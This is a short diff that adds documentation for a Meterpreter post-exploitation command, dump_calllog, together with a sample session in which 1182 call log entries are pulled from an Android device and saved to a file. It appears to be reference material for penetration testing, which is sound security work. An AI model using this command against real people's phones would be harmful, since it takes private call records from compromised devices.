@@ -1,0 +1,7 @@
+The dump_calllog command retrieves the call log from the Android device.
+
+meterpreter > dump_calllog
+[*] Fetching 1182 entries
+[*] Call log saved to calllog_dump_20231205012554.txt
+
+
